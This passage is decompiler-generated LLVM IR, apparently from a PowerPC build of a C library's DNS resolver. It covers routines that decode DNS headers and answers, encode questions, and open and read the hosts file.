  %v1_100143c0 = trunc i32 %v3_100143bc to i8
  %v4_100143c0 = add i32 %arg2, 11
  %v5_100143c0 = inttoptr i32 %v4_100143c0 to i8*
  store i8 %v1_100143c0, i8* %v5_100143c0, align 1
  %v0_100143c4.pre = load i32, i32* %r7.global-to-local, align 4
  br label %dec_label_pc_100143c4

dec_label_pc_100143c4:                            ; preds = %entry, %dec_label_pc_100142ec
  %v0_100143c4 = phi i32 [ -1, %entry ], [ %v0_100143c4.pre, %dec_label_pc_100142ec ]
  ret i32 %v0_100143c4

; uselistorder directives
  uselistorder i32 %v1_10014374, { 1, 0 }
  uselistorder i32 %v1_1001434c, { 1, 0 }
  uselistorder i32 %tmp, { 0, 15, 14, 2, 13, 6, 9, 8, 12, 11, 10, 1, 3, 5, 4, 7 }
  uselistorder i32* %r0.global-to-local, { 11, 12, 13, 14, 15, 0, 1, 2, 3, 4, 5, 6, 7, 8, 9, 10 }
  uselistorder i32 38, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_100143c4, { 1, 0 }
}

define i32 @__decode_header(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v3_100143cc = load i8, i8* %arg1, align 1
  %v4_100143cc = zext i8 %v3_100143cc to i32
  store i32 %tmp, i32* %r9.global-to-local, align 4
  %v2_100143d4 = add i32 %tmp, 1
  %v3_100143d4 = inttoptr i32 %v2_100143d4 to i8*
  %v4_100143d4 = load i8, i8* %v3_100143d4, align 1
  %v5_100143d4 = zext i8 %v4_100143d4 to i32
  %v1_100143dc = mul nuw nsw i32 %v4_100143cc, 256
  %v2_100143e0 = or i32 %v5_100143d4, %v1_100143dc
  %v2_100143e4 = inttoptr i32 %arg2 to i32*
  store i32 %v2_100143e0, i32* %v2_100143e4, align 4
  %v0_100143e8 = load i32, i32* %r9.global-to-local, align 4
  %v1_100143e8 = add i32 %v0_100143e8, 2
  %v2_100143e8 = inttoptr i32 %v1_100143e8 to i8*
  %v3_100143e8 = load i8, i8* %v2_100143e8, align 1
  %v4_100143e8 = zext i8 %v3_100143e8 to i32
  %v1_100143ec = call i32 @__asm_rlwinm(i32 %v4_100143e8, i32 25, i32 31, i32 31)
  %v2_100143f0 = add i32 %arg2, 4
  %v3_100143f0 = inttoptr i32 %v2_100143f0 to i32*
  store i32 %v1_100143ec, i32* %v3_100143f0, align 4
  %v0_100143f4 = load i32, i32* %r9.global-to-local, align 4
  %v1_100143f4 = add i32 %v0_100143f4, 2
  %v2_100143f4 = inttoptr i32 %v1_100143f4 to i8*
  %v3_100143f4 = load i8, i8* %v2_100143f4, align 1
  %v4_100143f4 = zext i8 %v3_100143f4 to i32
  %v1_100143f8 = call i32 @__asm_rlwinm(i32 %v4_100143f4, i32 29, i32 28, i32 31)
  %v2_100143fc = add i32 %arg2, 8
  %v3_100143fc = inttoptr i32 %v2_100143fc to i32*
  store i32 %v1_100143f8, i32* %v3_100143fc, align 4
  %v0_10014400 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014400 = add i32 %v0_10014400, 2
  %v2_10014400 = inttoptr i32 %v1_10014400 to i8*
  %v3_10014400 = load i8, i8* %v2_10014400, align 1
  %v4_10014400 = zext i8 %v3_10014400 to i32
  %v1_10014404 = call i32 @__asm_rlwinm(i32 %v4_10014400, i32 30, i32 31, i32 31)
  %v2_10014408 = add i32 %arg2, 12
  %v3_10014408 = inttoptr i32 %v2_10014408 to i32*
  store i32 %v1_10014404, i32* %v3_10014408, align 4
  %v0_1001440c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001440c = add i32 %v0_1001440c, 2
  %v2_1001440c = inttoptr i32 %v1_1001440c to i8*
  %v3_1001440c = load i8, i8* %v2_1001440c, align 1
  %v4_1001440c = zext i8 %v3_1001440c to i32
  %v1_10014410 = call i32 @__asm_rlwinm(i32 %v4_1001440c, i32 31, i32 31, i32 31)
  %v2_10014414 = add i32 %arg2, 16
  %v3_10014414 = inttoptr i32 %v2_10014414 to i32*
  store i32 %v1_10014410, i32* %v3_10014414, align 4
  %v0_10014418 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014418 = add i32 %v0_10014418, 2
  %v2_10014418 = inttoptr i32 %v1_10014418 to i8*
  %v3_10014418 = load i8, i8* %v2_10014418, align 1
  %tmp1 = urem i8 %v3_10014418, 2
  %v1_1001441c = zext i8 %tmp1 to i32
  %v2_10014420 = add i32 %arg2, 20
  %v3_10014420 = inttoptr i32 %v2_10014420 to i32*
  store i32 %v1_1001441c, i32* %v3_10014420, align 4
  %v0_10014424 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014424 = add i32 %v0_10014424, 3
  %v2_10014424 = inttoptr i32 %v1_10014424 to i8*
  %v3_10014424 = load i8, i8* %v2_10014424, align 1
  %v4_10014424 = zext i8 %v3_10014424 to i32
  %v1_10014428 = call i32 @__asm_rlwinm(i32 %v4_10014424, i32 25, i32 31, i32 31)
  %v2_1001442c = add i32 %arg2, 24
  %v3_1001442c = inttoptr i32 %v2_1001442c to i32*
  store i32 %v1_10014428, i32* %v3_1001442c, align 4
  %v0_10014430 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014430 = add i32 %v0_10014430, 3
  %v2_10014430 = inttoptr i32 %v1_10014430 to i8*
  %v3_10014430 = load i8, i8* %v2_10014430, align 1
  %tmp2 = urem i8 %v3_10014430, 16
  %v1_10014434 = zext i8 %tmp2 to i32
  %v2_10014438 = add i32 %arg2, 28
  %v3_10014438 = inttoptr i32 %v2_10014438 to i32*
  store i32 %v1_10014434, i32* %v3_10014438, align 4
  %v0_1001443c = load i32, i32* %r9.global-to-local, align 4
  %v1_1001443c = add i32 %v0_1001443c, 4
  %v2_1001443c = inttoptr i32 %v1_1001443c to i8*
  %v3_1001443c = load i8, i8* %v2_1001443c, align 1
  %v4_1001443c = zext i8 %v3_1001443c to i32
  %v1_10014440 = add i32 %v0_1001443c, 5
  %v2_10014440 = inttoptr i32 %v1_10014440 to i8*
  %v3_10014440 = load i8, i8* %v2_10014440, align 1
  %v4_10014440 = zext i8 %v3_10014440 to i32
  %v1_10014444 = mul nuw nsw i32 %v4_1001443c, 256
  %v2_10014448 = or i32 %v4_10014440, %v1_10014444
  %v2_1001444c = add i32 %arg2, 32
  %v3_1001444c = inttoptr i32 %v2_1001444c to i32*
  store i32 %v2_10014448, i32* %v3_1001444c, align 4
  %v0_10014450 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014450 = add i32 %v0_10014450, 6
  %v2_10014450 = inttoptr i32 %v1_10014450 to i8*
  %v3_10014450 = load i8, i8* %v2_10014450, align 1
  %v4_10014450 = zext i8 %v3_10014450 to i32
  %v1_10014454 = add i32 %v0_10014450, 7
  %v2_10014454 = inttoptr i32 %v1_10014454 to i8*
  %v3_10014454 = load i8, i8* %v2_10014454, align 1
  %v4_10014454 = zext i8 %v3_10014454 to i32
  %v1_10014458 = mul nuw nsw i32 %v4_10014450, 256
  %v2_1001445c = or i32 %v4_10014454, %v1_10014458
  %v2_10014460 = add i32 %arg2, 36
  %v3_10014460 = inttoptr i32 %v2_10014460 to i32*
  store i32 %v2_1001445c, i32* %v3_10014460, align 4
  %v0_10014464 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014464 = add i32 %v0_10014464, 8
  %v2_10014464 = inttoptr i32 %v1_10014464 to i8*
  %v3_10014464 = load i8, i8* %v2_10014464, align 1
  %v4_10014464 = zext i8 %v3_10014464 to i32
  %v1_10014468 = add i32 %v0_10014464, 9
  %v2_10014468 = inttoptr i32 %v1_10014468 to i8*
  %v3_10014468 = load i8, i8* %v2_10014468, align 1
  %v4_10014468 = zext i8 %v3_10014468 to i32
  %v1_1001446c = mul nuw nsw i32 %v4_10014464, 256
  %v2_10014470 = or i32 %v4_10014468, %v1_1001446c
  %v2_10014474 = add i32 %arg2, 40
  %v3_10014474 = inttoptr i32 %v2_10014474 to i32*
  store i32 %v2_10014470, i32* %v3_10014474, align 4
  %v0_10014478 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014478 = add i32 %v0_10014478, 10
  %v2_10014478 = inttoptr i32 %v1_10014478 to i8*
  %v3_10014478 = load i8, i8* %v2_10014478, align 1
  %v4_10014478 = zext i8 %v3_10014478 to i32
  %v1_1001447c = add i32 %v0_10014478, 11
  %v2_1001447c = inttoptr i32 %v1_1001447c to i8*
  %v3_1001447c = load i8, i8* %v2_1001447c, align 1
  %v4_1001447c = zext i8 %v3_1001447c to i32
  store i32 %v4_1001447c, i32* %r9.global-to-local, align 4
  %v1_10014480 = mul nuw nsw i32 %v4_10014478, 256
  %v2_10014484 = or i32 %v4_1001447c, %v1_10014480
  %v2_10014488 = add i32 %arg2, 44
  %v3_10014488 = inttoptr i32 %v2_10014488 to i32*
  store i32 %v2_10014484, i32* %v3_10014488, align 4
  ret i32 12

; uselistorder directives
  uselistorder i32 44, { 9, 10, 7, 8, 15, 6, 14, 12, 0, 11, 1, 2, 3, 4, 5, 13 }
  uselistorder i32 11, { 13, 14, 6, 16, 5, 3, 7, 0, 1, 8, 9, 10, 11, 12, 2, 4, 15 }
  uselistorder i32 40, { 8, 9, 1, 11, 10, 0, 2, 3, 4, 5, 6, 7, 12 }
  uselistorder i32 7, { 10, 11, 3, 6, 7, 8, 9, 1, 2, 4, 5, 0, 12, 13 }
  uselistorder i32 5, { 16, 17, 7, 8, 9, 2, 3, 10, 0, 11, 12, 1, 13, 14, 4, 5, 15, 6, 18 }
  uselistorder i8 2, { 0, 2, 1 }
  uselistorder i32 30, { 10, 9, 5, 6, 7, 8, 0, 1, 2, 11, 12, 3, 4, 13, 14, 15, 16 }
  uselistorder i32 28, { 34, 35, 36, 37, 4, 5, 10, 38, 16, 48, 42, 0, 43, 44, 45, 6, 7, 17, 12, 11, 39, 40, 18, 19, 20, 21, 22, 23, 26, 24, 25, 1, 27, 49, 41, 13, 14, 15, 28, 2, 3, 29, 8, 9, 30, 31, 32, 33, 46, 47 }
  uselistorder i32 29, { 9, 12, 13, 10, 11, 6, 2, 15, 3, 16, 0, 1, 17, 18, 7, 8, 21, 22, 19, 20, 4, 5, 14 }
  uselistorder i32 %arg2, { 0, 1, 7, 2, 3, 4, 11, 10, 9, 8, 5, 6 }
}

define i32 @__encode_question(i32* %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %r3.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* @r5, align 4
  store i32 %arg2, i32* @r4, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  store i32 %tmp, i32* %r3.global-to-local, align 4
  store i32 %arg2, i32* @r30, align 4
  %v2_100144ac = load i32, i32* %arg1, align 4
  store i32 %v2_100144ac, i32* %r3.global-to-local, align 4
  store i32 268518580, i32* @lr, align 4
  %v1_100144b0 = inttoptr i32 %v2_100144ac to i8*
  %v2_100144b0 = call i32 @__encode_dotted(i8* %v1_100144b0)
  store i32 %v2_100144b0, i32* %r3.global-to-local, align 4
  %v1_100144b4 = icmp slt i32 %v2_100144b0, 0
  %v1_100144b8 = load i32, i32* @r29, align 4
  %v2_100144b8 = sub i32 %v1_100144b8, %v2_100144b0
  store i32 %v2_100144b8, i32* @r29, align 4
  br i1 %v1_100144b4, label %dec_label_pc_100144f8, label %dec_label_pc_100144c4

dec_label_pc_100144c4:                            ; preds = %entry
  %v2_100144bc = icmp sgt i32 %v2_100144b8, 3
  %v0_100144c4 = load i32, i32* @r30, align 4
  %v2_100144c4 = add i32 %v0_100144c4, %v2_100144b0
  store i32 %v2_100144c4, i32* %r9.global-to-local, align 4
  br i1 %v2_100144bc, label %dec_label_pc_100144d4, label %dec_label_pc_100144cc

dec_label_pc_100144cc:                            ; preds = %dec_label_pc_100144c4
  store i32 -1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100144f8

dec_label_pc_100144d4:                            ; preds = %dec_label_pc_100144c4
  %v0_100144d4 = load i32, i32* @r31, align 4
  %v1_100144d4 = add i32 %v0_100144d4, 6
  %v2_100144d4 = inttoptr i32 %v1_100144d4 to i8*
  %v3_100144d4 = load i8, i8* %v2_100144d4, align 1
  %v5_100144d8 = inttoptr i32 %v2_100144c4 to i8*
  store i8 %v3_100144d4, i8* %v5_100144d8, align 1
  %v0_100144dc = load i32, i32* %r3.global-to-local, align 4
  %v1_100144dc = add i32 %v0_100144dc, 4
  store i32 %v1_100144dc, i32* %r3.global-to-local, align 4
  %v0_100144e0 = load i32, i32* @r31, align 4
  %v1_100144e0 = add i32 %v0_100144e0, 4
  %v2_100144e0 = inttoptr i32 %v1_100144e0 to i32*
  %v3_100144e0 = load i32, i32* %v2_100144e0, align 4
  %v1_100144e4 = trunc i32 %v3_100144e0 to i8
  %v2_100144e4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100144e4 = add i32 %v2_100144e4, 1
  %v4_100144e4 = inttoptr i32 %v3_100144e4 to i8*
  store i8 %v1_100144e4, i8* %v4_100144e4, align 1
  %v0_100144e8 = load i32, i32* @r31, align 4
  %v1_100144e8 = add i32 %v0_100144e8, 10
  %v2_100144e8 = inttoptr i32 %v1_100144e8 to i8*
  %v3_100144e8 = load i8, i8* %v2_100144e8, align 1
  %v2_100144ec = load i32, i32* %r9.global-to-local, align 4
  %v3_100144ec = add i32 %v2_100144ec, 2
  %v4_100144ec = inttoptr i32 %v3_100144ec to i8*
  store i8 %v3_100144e8, i8* %v4_100144ec, align 1
  %v0_100144f0 = load i32, i32* @r31, align 4
  %v1_100144f0 = add i32 %v0_100144f0, 8
  %v2_100144f0 = inttoptr i32 %v1_100144f0 to i32*
  %v3_100144f0 = load i32, i32* %v2_100144f0, align 4
  %v1_100144f4 = trunc i32 %v3_100144f0 to i8
  %v2_100144f4 = load i32, i32* %r9.global-to-local, align 4
  %v3_100144f4 = add i32 %v2_100144f4, 3
  %v4_100144f4 = inttoptr i32 %v3_100144f4 to i8*
  store i8 %v1_100144f4, i8* %v4_100144f4, align 1
  %v0_10014508.pre = load i32, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_100144f8

dec_label_pc_100144f8:                            ; preds = %entry, %dec_label_pc_100144cc, %dec_label_pc_100144d4
  %v0_10014508 = phi i32 [ %v2_100144b0, %entry ], [ -1, %dec_label_pc_100144cc ], [ %v0_10014508.pre, %dec_label_pc_100144d4 ]
  ret i32 %v0_10014508

; uselistorder directives
  uselistorder i32 %v2_100144b0, { 1, 0, 2, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 1, 2, 4, 3, 5, 6, 0 }
  uselistorder label %dec_label_pc_100144f8, { 2, 1, 0 }
}

define i32 @__length_question(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 268518684, i32* @lr, align 4
  %v0_10014518 = call i32 @__length_dotted()
  %v1_1001451c = icmp slt i32 %v0_10014518, 0
  br i1 %v1_1001451c, label %dec_label_pc_10014528, label %dec_label_pc_10014524

dec_label_pc_10014524:                            ; preds = %entry
  %v1_10014524 = add i32 %v0_10014518, 4
  br label %dec_label_pc_10014528

dec_label_pc_10014528:                            ; preds = %entry, %dec_label_pc_10014524
  %v0_10014534 = phi i32 [ %v0_10014518, %entry ], [ %v1_10014524, %dec_label_pc_10014524 ]
  ret i32 %v0_10014534

; uselistorder directives
  uselistorder label %dec_label_pc_10014528, { 1, 0 }
}

define i32 @__decode_answer(i32 %arg1, i32 %arg2, i32 %arg3, i32* %arg4) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r10.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg4 to i32
  store i32 %tmp, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* @r4, align 4
  %stack_var_-280 = alloca i32, align 4
  %v0_1001453c = load i32, i32* @lr, align 4
  store i32 %v0_1001453c, i32* %r0.global-to-local, align 4
  %v2_10014544 = ptrtoint i32* %stack_var_-280 to i32
  store i32 %v2_10014544, i32* @r30, align 4
  store i32 %arg3, i32* @r29, align 4
  store i32 %tmp, i32* @r31, align 4
  store i32 256, i32* @r6, align 4
  store i32 %arg2, i32* @r28, align 4
  store i32 268518760, i32* @lr, align 4
  %v2_10014564 = call i32 @__decode_dotted(i32 %v2_10014544, i32 256)
  store i32 %v2_10014564, i32* @r27, align 4
  %v1_10014568 = icmp slt i32 %v2_10014564, 0
  %v0_1001456c = load i32, i32* @r28, align 4
  %v2_1001456c = add i32 %v0_1001456c, %v2_10014564
  store i32 %v2_1001456c, i32* @r28, align 4
  %v1_10014570 = load i32, i32* @r29, align 4
  %v2_10014570 = sub i32 %v1_10014570, %v2_1001456c
  %v1_10014574 = add i32 %v2_10014570, -10
  br i1 %v1_10014568, label %dec_label_pc_10014630, label %dec_label_pc_10014580

dec_label_pc_10014580:                            ; preds = %entry
  %v0_10014584 = load i32, i32* @r26, align 4
  %v2_10014584 = add i32 %v0_10014584, %v2_1001456c
  store i32 %v2_10014584, i32* @r30, align 4
  %tmp6 = icmp sgt i32 %v1_10014574, -1
  br i1 %tmp6, label %dec_label_pc_10014594, label %dec_label_pc_1001458c

dec_label_pc_1001458c:                            ; preds = %dec_label_pc_10014580
  store i32 %v1_10014574, i32* @r27, align 4
  br label %dec_label_pc_10014630

dec_label_pc_10014594:                            ; preds = %dec_label_pc_10014580
  store i32 268518808, i32* @lr, align 4
  %v1_10014594 = call i32 @__GI_strdup(i32 %v2_10014544)
  %v0_10014598 = load i32, i32* @r30, align 4
  %v1_10014598 = add i32 %v0_10014598, 2
  store i32 %v1_10014598, i32* %r8.global-to-local, align 4
  %v1_1001459c = load i32, i32* @r31, align 4
  %v2_1001459c = inttoptr i32 %v1_1001459c to i32*
  store i32 %v1_10014594, i32* %v2_1001459c, align 4
  %v0_100145a0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100145a0 = add i32 %v0_100145a0, 2
  store i32 %v1_100145a0, i32* %r10.global-to-local, align 4
  %v0_100145a4 = load i32, i32* @r30, align 4
  %v1_100145a4 = add i32 %v0_100145a4, 10
  store i32 %v1_100145a4, i32* %r6.global-to-local, align 4
  %v0_100145a8 = load i32, i32* @r26, align 4
  %v1_100145a8 = load i32, i32* @r28, align 4
  %v2_100145a8 = add i32 %v1_100145a8, %v0_100145a8
  %v3_100145a8 = inttoptr i32 %v2_100145a8 to i8*
  %v4_100145a8 = load i8, i8* %v3_100145a8, align 1
  %v5_100145a8 = zext i8 %v4_100145a8 to i32
  store i32 %v5_100145a8, i32* %r0.global-to-local, align 4
  %v1_100145ac = add i32 %v0_100145a4, 1
  %v2_100145ac = inttoptr i32 %v1_100145ac to i8*
  %v3_100145ac = load i8, i8* %v2_100145ac, align 1
  %v4_100145ac = zext i8 %v3_100145ac to i32
  store i32 %v4_100145ac, i32* %r9.global-to-local, align 4
  %v1_100145b0 = mul nuw nsw i32 %v5_100145a8, 256
  %v2_100145b4 = or i32 %v4_100145ac, %v1_100145b0
  store i32 %v2_100145b4, i32* %r0.global-to-local, align 4
  %v1_100145b8 = load i32, i32* @r31, align 4
  %v2_100145b8 = add i32 %v1_100145b8, 4
  %v3_100145b8 = inttoptr i32 %v2_100145b8 to i32*
  store i32 %v2_100145b4, i32* %v3_100145b8, align 4
  %v0_100145bc = load i32, i32* @r30, align 4
  %v1_100145bc = add i32 %v0_100145bc, 2
  %v2_100145bc = inttoptr i32 %v1_100145bc to i8*
  %v3_100145bc = load i8, i8* %v2_100145bc, align 1
  %v4_100145bc = zext i8 %v3_100145bc to i32
  store i32 %v4_100145bc, i32* %r0.global-to-local, align 4
  %v0_100145c0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100145c0 = add i32 %v0_100145c0, 1
  %v2_100145c0 = inttoptr i32 %v1_100145c0 to i8*
  %v3_100145c0 = load i8, i8* %v2_100145c0, align 1
  %v4_100145c0 = zext i8 %v3_100145c0 to i32
  store i32 %v4_100145c0, i32* %r9.global-to-local, align 4
  %v1_100145c4 = mul nuw nsw i32 %v4_100145bc, 256
  %v2_100145c8 = or i32 %v4_100145c0, %v1_100145c4
  store i32 %v2_100145c8, i32* %r0.global-to-local, align 4
  %v1_100145cc = load i32, i32* @r31, align 4
  %v2_100145cc = add i32 %v1_100145cc, 8
  %v3_100145cc = inttoptr i32 %v2_100145cc to i32*
  store i32 %v2_100145c8, i32* %v3_100145cc, align 4
  %v0_100145d0 = load i32, i32* %r8.global-to-local, align 4
  %v1_100145d0 = add i32 %v0_100145d0, 2
  %v2_100145d0 = inttoptr i32 %v1_100145d0 to i8*
  %v3_100145d0 = load i8, i8* %v2_100145d0, align 1
  %v4_100145d0 = zext i8 %v3_100145d0 to i32
  store i32 %v4_100145d0, i32* %r0.global-to-local, align 4
  %v0_100145d4 = load i32, i32* %r10.global-to-local, align 4
  %v1_100145d4 = add i32 %v0_100145d4, 1
  %v2_100145d4 = inttoptr i32 %v1_100145d4 to i8*
  %v3_100145d4 = load i8, i8* %v2_100145d4, align 1
  %v4_100145d4 = zext i8 %v3_100145d4 to i32
  store i32 %v4_100145d4, i32* %r11.global-to-local, align 4
  %v1_100145d8 = add i32 %v0_100145d4, 3
  %v2_100145d8 = inttoptr i32 %v1_100145d8 to i8*
  %v3_100145d8 = load i8, i8* %v2_100145d8, align 1
  %v4_100145d8 = zext i8 %v3_100145d8 to i32
  %v1_100145dc = mul nuw i32 %v4_100145d0, 16777216
  store i32 %v1_100145dc, i32* %r0.global-to-local, align 4
  %v1_100145e0 = add i32 %v0_100145d4, 2
  %v2_100145e0 = inttoptr i32 %v1_100145e0 to i8*
  %v3_100145e0 = load i8, i8* %v2_100145e0, align 1
  %v4_100145e0 = zext i8 %v3_100145e0 to i32
  %v1_100145e4 = mul nuw nsw i32 %v4_100145d4, 65536
  %v2_100145e8 = or i32 %v1_100145e4, %v1_100145dc
  %v0_100145ec = load i32, i32* @r28, align 4
  %v1_100145ec = add i32 %v0_100145ec, 10
  store i32 %v1_100145ec, i32* %r11.global-to-local, align 4
  %v2_100145f0 = or i32 %v2_100145e8, %v4_100145d8
  store i32 %v2_100145f0, i32* %r0.global-to-local, align 4
  %v1_100145f4 = mul nuw nsw i32 %v4_100145e0, 256
  %v2_100145f8 = or i32 %v1_100145f4, %v2_100145f0
  store i32 %v2_100145f8, i32* %r9.global-to-local, align 4
  %v1_100145fc = load i32, i32* @r31, align 4
  %v2_100145fc = add i32 %v1_100145fc, 12
  %v3_100145fc = inttoptr i32 %v2_100145fc to i32*
  store i32 %v2_100145f8, i32* %v3_100145fc, align 4
  %v0_10014600 = load i32, i32* %r8.global-to-local, align 4
  %v1_10014600 = add i32 %v0_10014600, 6
  %v2_10014600 = inttoptr i32 %v1_10014600 to i8*
  %v3_10014600 = load i8, i8* %v2_10014600, align 1
  %v4_10014600 = zext i8 %v3_10014600 to i32
  store i32 %v4_10014600, i32* %r9.global-to-local, align 4
  %v0_10014604 = load i32, i32* @r30, align 4
  %v1_10014604 = add i32 %v0_10014604, 9
  %v2_10014604 = inttoptr i32 %v1_10014604 to i8*
  %v3_10014604 = load i8, i8* %v2_10014604, align 1
  %v4_10014604 = zext i8 %v3_10014604 to i32
  store i32 %v4_10014604, i32* %r0.global-to-local, align 4
  %v1_10014608 = mul nuw nsw i32 %v4_10014600, 256
  store i32 %v1_10014608, i32* %r9.global-to-local, align 4
  %v0_1001460c = load i32, i32* %r11.global-to-local, align 4
  %v1_1001460c = load i32, i32* @r31, align 4
  %v2_1001460c = add i32 %v1_1001460c, 24
  %v3_1001460c = inttoptr i32 %v2_1001460c to i32*
  store i32 %v0_1001460c, i32* %v3_1001460c, align 4
  %v0_10014610 = load i32, i32* %r9.global-to-local, align 4
  %v1_10014610 = load i32, i32* %r0.global-to-local, align 4
  %v2_10014610 = or i32 %v1_10014610, %v0_10014610
  store i32 %v2_10014610, i32* %r9.global-to-local, align 4
  %v0_10014614 = load i32, i32* %r6.global-to-local, align 4
  %v1_10014614 = load i32, i32* @r31, align 4
  %v2_10014614 = add i32 %v1_10014614, 20
  %v3_10014614 = inttoptr i32 %v2_10014614 to i32*
  store i32 %v0_10014614, i32* %v3_10014614, align 4
  %v0_10014618 = load i32, i32* @r29, align 4
  %v1_10014618 = load i32, i32* %r9.global-to-local, align 4
  %v2_10014618 = icmp slt i32 %v0_10014618, %v1_10014618
  %v1_1001461c = add i32 %v1_10014618, 10
  store i32 %v1_1001461c, i32* %r0.global-to-local, align 4
  %v0_10014620 = load i32, i32* @r27, align 4
  %v2_10014620 = add i32 %v0_10014620, %v1_1001461c
  store i32 %v2_10014620, i32* @r27, align 4
  %v1_10014624 = load i32, i32* @r31, align 4
  %v2_10014624 = add i32 %v1_10014624, 16
  %v3_10014624 = inttoptr i32 %v2_10014624 to i32*
  store i32 %v1_10014618, i32* %v3_10014624, align 4
  br i1 %v2_10014618, label %dec_label_pc_1001462c, label %dec_label_pc_10014594.dec_label_pc_10014630_crit_edge

dec_label_pc_10014594.dec_label_pc_10014630_crit_edge: ; preds = %dec_label_pc_10014594
  %v0_10014634.pre = load i32, i32* @r27, align 4
  br label %dec_label_pc_10014630

dec_label_pc_1001462c:                            ; preds = %dec_label_pc_10014594
  store i32 -1, i32* @r27, align 4
  br label %dec_label_pc_10014630

dec_label_pc_10014630:                            ; preds = %dec_label_pc_10014594.dec_label_pc_10014630_crit_edge, %entry, %dec_label_pc_1001458c, %dec_label_pc_1001462c
  %v0_10014634 = phi i32 [ %v0_10014634.pre, %dec_label_pc_10014594.dec_label_pc_10014630_crit_edge ], [ %v2_10014564, %entry ], [ %v1_10014574, %dec_label_pc_1001458c ], [ -1, %dec_label_pc_1001462c ]
  store i32 %v0_1001453c, i32* %r0.global-to-local, align 4
  ret i32 %v0_10014634

; uselistorder directives
  uselistorder i32 %v1_10014618, { 1, 0, 2 }
  uselistorder i32 %v1_100145dc, { 1, 0 }
  uselistorder i32 %v1_10014574, { 1, 2, 0 }
  uselistorder i32 %v2_10014564, { 1, 0, 2, 3 }
  uselistorder i32 %v2_10014544, { 1, 0, 2 }
  uselistorder i32* %r6.global-to-local, { 1, 2, 0 }
  uselistorder i32 20, { 31, 32, 33, 34, 1, 13, 35, 36, 14, 15, 16, 17, 5, 6, 29, 7, 0, 41, 42, 18, 19, 20, 21, 22, 24, 25, 23, 40, 37, 8, 9, 10, 11, 12, 26, 27, 28, 4, 30, 2, 3, 38, 39 }
  uselistorder i32 9, { 18, 19, 20, 21, 1, 9, 2, 10, 3, 11, 0, 12, 13, 14, 15, 16, 4, 5, 6, 7, 8, 17, 22, 23, 24 }
  uselistorder i32 65536, { 0, 37, 1, 2, 3, 4, 6, 5, 7, 8, 9, 40, 10, 11, 12, 38, 13, 15, 14, 16, 39, 17, 19, 18, 20, 22, 21, 23, 24, 25, 28, 27, 26, 30, 31, 29, 32, 34, 35, 33, 36 }
  uselistorder i32 3, { 47, 48, 49, 50, 51, 52, 53, 54, 55, 1, 38, 2, 0, 8, 18, 20, 19, 10, 21, 57, 9, 63, 3, 58, 59, 39, 40, 22, 41, 42, 23, 24, 25, 26, 27, 35, 37, 64, 65, 36, 68, 45, 14, 4, 5, 60, 66, 67, 6, 73, 74, 75, 69, 70, 71, 72, 12, 44, 43, 56, 7, 13, 46, 15, 28, 16, 29, 30, 61, 62, 31, 32, 33, 17, 34, 11 }
  uselistorder i32 (i32)* @__GI_strdup, { 0, 2, 1 }
  uselistorder i32 -10, { 5, 0, 1, 2, 3, 4 }
  uselistorder i32 256, { 0, 1, 2, 3, 46, 52, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 44, 16, 17, 18, 19, 20, 21, 22, 23, 49, 24, 50, 51, 55, 25, 26, 27, 28, 29, 54, 47, 30, 31, 32, 33, 53, 34, 35, 36, 37, 38, 39, 40, 45, 48, 41, 42, 43 }
  uselistorder label %dec_label_pc_10014630, { 3, 0, 2, 1 }
}

define i32 @__open_etc_hosts() local_unnamed_addr {
entry:
  %v0_1001464c = load i32, i32* @lr, align 4
  store i32 268519024, i32* @lr, align 4
  %v3_1001466c = call i32 @__GI_fopen(i32 ptrtoint ([11 x i8]* @global_var_10018208.744 to i32), i32 ptrtoint (i32* @global_var_100181a4.714 to i32))
  %v3_10014674 = icmp eq i32 %v3_1001466c, 0
  br i1 %v3_10014674, label %dec_label_pc_1001467c, label %dec_label_pc_10014698

dec_label_pc_1001467c:                            ; preds = %entry
  %v0_10014670 = load i32, i32* @r29, align 4
  store i32 %v0_1001464c, i32* @lr, align 4
  %v3_10014694 = call i32 @__GI_fopen(i32 ptrtoint ([18 x i8]* @global_var_10018214.745 to i32), i32 %v0_10014670)
  br label %dec_label_pc_10014698

dec_label_pc_10014698:                            ; preds = %entry, %dec_label_pc_1001467c
  %v0_100146a8 = phi i32 [ %v3_1001466c, %entry ], [ %v3_10014694, %dec_label_pc_1001467c ]
  ret i32 %v0_100146a8

; uselistorder directives
  uselistorder i32 (i32, i32)* @__GI_fopen, { 6, 0, 5, 4, 3, 2, 1 }
  uselistorder label %dec_label_pc_10014698, { 1, 0 }
}

define i32 @__read_etc_hosts_r(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32* %arg5, i32 %arg6, i32 %arg7, i32 %arg8, i32 %arg9) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r19.global-to-local = alloca i32, align 4
  %r21.global-to-local = alloca i32, align 4
